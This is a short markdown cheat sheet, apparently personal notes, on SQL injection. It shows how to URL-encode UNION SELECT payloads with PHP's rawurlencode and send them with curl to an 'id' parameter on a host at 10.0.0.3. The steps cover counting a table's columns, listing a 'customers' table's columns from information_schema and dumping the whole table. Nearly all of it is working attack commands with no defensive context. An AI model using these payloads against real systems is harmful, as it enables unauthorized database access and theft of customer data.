# SQL Injection

### Describe table columns
First the one need to find how many columns there are in the table
```bash
php -a
# check if the table has four columns
echo rawurlencode(' union select 1,2,3,4');

# At another tab
curl 10.0.0.3?id="1%20union%20select%201%2C2%2C3%2C4"
# if the curl does not return error, then, the table has four columns

```
### General examples
```bash
php -a

echo rawurlencode(' UNION SELECT 1,column_name,column_type,4 FROM information_schema.columns WHERE table_name="customers" -- ');

echo rawurlencode(' UNION SELECT * FROM customers -- ');

# At another cli tab
curl 10.0.0.3?id="1"

curl 10.0.0.3?id="1%20UNION%20SELECT%201%2Ccolumn_name%2Ccolumn_type%2C4%20FROM%20information_schema.columns%20WHERE%20table_name%3D%22customers%22%20--%20"

curl 10.0.0.3?id="1%20UNION%20SELECT%20%2A%20FROM%20customers%20--%20"

```
